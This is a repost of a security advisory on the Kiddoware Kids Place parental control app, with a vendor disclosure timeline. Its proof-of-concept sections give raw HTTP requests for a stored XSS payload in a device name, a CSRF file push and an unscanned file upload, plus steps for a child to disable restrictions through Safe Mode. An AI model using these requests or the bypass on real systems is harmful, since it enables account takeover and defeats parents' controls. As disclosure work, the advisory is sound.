@@ -1,0 +1,262 @@
+id: 38686
+date: 05/19/2023
+title: Kiddoware Kids Place Parental Control Android App 3.8.49 XSS / CSRF / File Upload Vulnerabilities
+author: Fabian Densborn
+cves: CVE-2023-28153, CVE-2023-29078, CVE-2023-29079
+
+=======================================================================
+               title: Multiple Vulnerabilities
+             product: Kiddoware Kids Place Parental Control Android App
+  vulnerable version: <=3.8.49
+       fixed version: 3.8.50 or higher
+          CVE number: CVE-2023-28153, CVE-2023-29078, CVE-2023-29079
+              impact: High
+            homepage: https://kiddoware.com
+               found: 2022-09-29
+                  by: Fabian Densborn (Office Vienna)
+                      Bernhard Gründling (Office Vienna)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult.
+                      SEC Consult is part of Eviden, an atos business
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Kiddoware is the world’s leading parental control solutions company
+with a wide range of products and  serving over 5 million families
+worldwide. Kiddoware is committed in helping you to protect your kids
+while providing you intelligence to be proactive about your childs’
+online activities."
+
+Source: https://kiddoware.com/
+
+
+Business recommendation:
+------------------------
+The vendor provides an update for the affected version(s) which
+should be installed immediately.
+
+An in-depth security analysis performed by security professionals is
+highly advised, to identify and resolve potential further critical security
+issues.
+
+The issues identified in this application were part of our blog post
+"The hidden costs of parental control apps" published a few months ago:
+https://r.sec-consult.com/parents
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Login and registration returns password as MD5 hash
+Login and registration requests return the unsalted MD5 hash
+of the password. This indicates that the passwords are stored
+in an insecure format at the server. Furthermore, MD5 hashing
+should not be used anymore in modern applications.
+
+
+2) Stored XSS via device name in parent Dashboard (CVE-2023-29079)
+The customizable name of the child's device can be used to
+trigger a XSS payload in the parent web dashboard. Children
+might be able to attack their parents' account.
+
+
+3) Possible CSRF attacks in parent Dashboard (CVE-2023-29078)
+All requests in the web dashboard are vulnerable to CSRF attacks.
+The requests contain the device Id of the child device which must
+be known to the attacker in order to successfully attack a child.
+But the device Id is not considered a secret, as it is used in
+the URL in some requests. An attacker could have obtained the Id
+through the browser history.
+
+
+4) Arbitrary File Upload to AWS S3 bucket
+The web dashboard lets parents send files to the child's device.
+The selected file is uploaded to an AWS S3 bucket and the returned
+URL will be transmitted to the device which will then download it.
+It is possible to send arbitrary files to the child's device and
+thereby upload arbitrary files (size restriction ~10MB) to the
+AWS S3 bucket. The returned link is publicly available, so it is
+possible to use the server to spread malware.
+
+
+5) Disable Child App Restriction without Parent's notice (CVE-2023-28153)
+The child can remove all restrictions temporarily without the parents noticing.
+
+
+
+Proof of concept:
+-----------------
+1) Login and registration returns password as MD5 hash
+The "Change password" request looks as follows:
+--------------------------------------------------------------------------------
+POST /account/change_password/ HTTP/1.1
+Host: kidsplace.kiddoware.com
+Cookie: [...]
+[...]
+
+old_password=c869123c&new_password=password&confirm_password=password
+--------------------------------------------------------------------------------
+
+The response from the web server contains the hashed, unsalted password:
+--------------------------------------------------------------------------------
+{
+  "error":null,
+  "result":
+    {
+      "email":"xxxxx@example.com",
+      "hashed_password":"5f4dcc3b5aa765d61d8327deb882cf99",
+      "message":"Password successfully changed!"
+    },
+  "status":200
+}
+--------------------------------------------------------------------------------
+
+Proving this is an unsalted MD5 hash:
+
+$ echo -n "password" | md5sum -t
+5f4dcc3b5aa765d61d8327deb882cf99  -
+
+
+2) Stored XSS via device name in parent Dashboard (CVE-2023-29079)
+The device name can be changed by the child's account by sending a POST request
+to the API with the pushDeviceConfig method. The following payload can be used as
+a PoC to trigger an alert box on every page the device name is visible in the
+parent dashboard. Children/attackers would be able to take over their parents'
+accounts via this attack.
+
+--------------------------------------------------------------------------------
+POST /v2/api/ HTTP/1.1
+Host: kidsplace.kiddoware.com
+Content-Type: application/json; charset=utf-8
+Content-Length: 461
+Accept-Encoding: gzip, deflate
+User-Agent: okhttp/3.12.8
+Connection: close
+
+{
+     "method":"pushDeviceConfig",
+     "id":null,
+     "params":["a28fd8c5-2dcd-11ed-8a7f-0217330f2cf9",
+     {
+         "isGPSEnabled":false,"deviceGCMRegID":"",
+         "deviceUserAgeRange":3,
+         "deviceName":"\"><img src=x onerror=\"alert(1)\"/>",
+         [...]
+     }
+}
+--------------------------------------------------------------------------------
+
+
+3) Possible CSRF attacks in parent Dashboard (CVE-2023-29078)
+As an example, an attacker can abuse the CSRF vulnerability to download an
+arbitrary file to a child's device. It is simply needed to create a form which
+automatically submits on page load. If a parent is logged in the web dashboard
+and visits this malicious site, the authenticated request will be sent and the
+file specified in the URL parameter will be downloaded by the child's device.
+
+--------------------------------------------------------------------------------
+POST /account/push_content/ HTTP/1.1
+Host: kidsplace.kiddoware.com
+Cookie: [...]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: https://kidsplace.kiddoware.com
+Content-Length: 75
+Connection: close
+
+url=https%3A%2F%2Fgoogle.de%2Findex.html&message=&deviceID=XXXXXXX
+--------------------------------------------------------------------------------
+
+
+4) Arbitrary File Upload to AWS S3 bucket
+The web dashboard lets parents upload arbitrary files to the Kiddoware AWS S3 bucket
+and push it to the child device.
+--------------------------------------------------------------------------------
+POST /account/push_content_file/ HTTP/1.1
+Host: kidsplace.kiddoware.com
+Cookie: [...]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Content-Type: multipart/form-data; boundary=---------------------------27687116714103572458683268551
+Origin: https://kidsplace.kiddoware.com
+Content-Length: 296
+[...]
+
+-----------------------------27687116714103572458683268551
+Content-Disposition: form-data; name="push_file"; filename="eicar.com.txt"
+Content-Type: text/plain
+
+<eicar-file>
+-----------------------------27687116714103572458683268551--
+--------------------------------------------------------------------------------
+
+The upload of the eicar file worked without errors and could subsequently also be
+downloaded  via the returned link. So there is no antivirus scan on the uploaded files.
+
+
+5) Disable Child App Restriction without Parent's notice (CVE-2023-28153)
+The child can disable the restrictions of the application without the parents noticing.
+For this, the following steps are necessary:
+a) If Android settings are blocked, reboot into Android Safe Mode.
+b) Disable "Display over other apps" Permission for the app in Android settings.
+c) After rebooting into normal mode, the child device can be used without restrictions.
+
+For example, previously locked apps can now be used. To notice the problem, the parent
+has to check the parent's dashboard manually, a notification is not sent. If the child
+turns the permission back on in the meantime, the bypass will go unnoticed.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested and downloaded through Google Play store, which was
+the most recent version available at the time of the test:
+* 3.8.45
+
+Later on, version 3.8.49 (2022-10-25) has been verified to be vulnerable as well.
+
+
+Vendor contact timeline:
+------------------------
+2022-11-23: Contacting vendor through kiddoware@kiddoware.com and support@kiddoware.com
+             Asking for security contact.
+2022-11-23: Response received, requesting advisory to be submitted to an employee mail.
+             No encryption demanded. Advisory sent to vendor.
+2022-11-28: Vendor informs about ongoing backend rewrites and removing some
+             upload functionalities. Some fixes will be live by Q1 2023.
+             Everything will be addressed by end of 01-04-2023.
+2022-12-15: SEC Consult informs about upcoming blog post about parental control apps.
+2022-12-15: Vendor states that most of the issues have already been fixed.
+2022-12-16: Recheck of vulnerabilities shows that not all vulnerabilities
+             have been sufficiently addressed. Vendor was informed.
+2022-12-16: Vendor explains what security measures will be implemented and
+             informs SEC Consult as soon as this is done.
+2022-12-30: Vendor informs that fixes for the found vulnerabilities have been published.
+2023-01-11: SEC Consult rechecks the vulnerabilities and found out that the applied
+             patches are not sufficient. Again, informs the vendor about it.
+2023-02-14: No response from vendor, reminder sent.
+2023-02-14: Vendor informs SEC Consult that all issues have been resolved.
+2023-03-10: Requesting CVE numbers.
+2023-03-12: Assigned CVE number for "Disable child restriction" finding.
+2023-03-31: Assigned CVE numbers for XSS and CSRF findings.
+2023-05-15: Public release of security advisory.
+
+
+Solution:
+---------
+The vendor provides a patched version which should be installed immediately through Google
+Play store.
+* Version: 3.8.50 or higher
+
+
+Workaround:
+-----------
+No workaround available.
+
+#  0day.today [2023-05-22]  #
